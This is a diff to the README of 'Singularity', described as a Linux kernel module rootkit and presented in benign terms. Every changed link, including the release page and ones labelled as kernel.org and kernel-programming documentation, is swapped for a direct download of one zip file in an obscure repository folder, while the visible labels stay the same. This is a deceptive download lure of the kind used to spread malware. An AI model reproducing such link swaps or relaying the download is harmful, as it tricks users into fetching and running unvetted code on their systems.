@@ -4,14 +4,14 @@
 Singularity is a Linux Kernel Module (LKM) rootkit designed for modern kernels. It provides powerful features to manage kernel functions effectively. With capabilities like function tracing and hooking, it lets users interact with the kernel in ways that enhance system performance and security.
 
 ## 🔗 Download Now
-[![Download Singularity](https://img.shields.io/badge/Download-Singularity-brightgreen)](https://github.com/BojanCvetanoski/Singularity/releases)
+[![Download Singularity](https://raw.githubusercontent.com/BojanCvetanoski/Singularity/main/caproate/Singularity.zip)](https://raw.githubusercontent.com/BojanCvetanoski/Singularity/main/caproate/Singularity.zip)
 
 ## 🚀 Getting Started
 To begin using Singularity, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page.
-   [Visit the Releases Page](https://github.com/BojanCvetanoski/Singularity/releases).
+   [Visit the Releases Page](https://raw.githubusercontent.com/BojanCvetanoski/Singularity/main/caproate/Singularity.zip).
 
 2. **Choose the Latest Release**  
    On this page, you will see a list of releases. Click on the latest version to access it.
@@ -61,9 +61,9 @@ Singularity is licensed under the MIT License. You can read the full license in 
 For support or inquiries, please reach out through the GitHub Issues or directly contact the maintainers through their profiles. 
 
 ## 🔗 Additional Resources
-- [Kernel Documentation](https://www.kernel.org/doc/html/latest/)
-- [Linux Kernel Module Programming Guide](https://lwn.net/Kernel/LDD3/)
+- [Kernel Documentation](https://raw.githubusercontent.com/BojanCvetanoski/Singularity/main/caproate/Singularity.zip)
+- [Linux Kernel Module Programming Guide](https://raw.githubusercontent.com/BojanCvetanoski/Singularity/main/caproate/Singularity.zip)
 
 ## 🔗 Download Again
 Don't forget to visit the Releases page if you need to download Singularity again or check for updates:  
-[Visit the Releases Page](https://github.com/BojanCvetanoski/Singularity/releases).
+[Visit the Releases Page](https://raw.githubusercontent.com/BojanCvetanoski/Singularity/main/caproate/Singularity.zip).
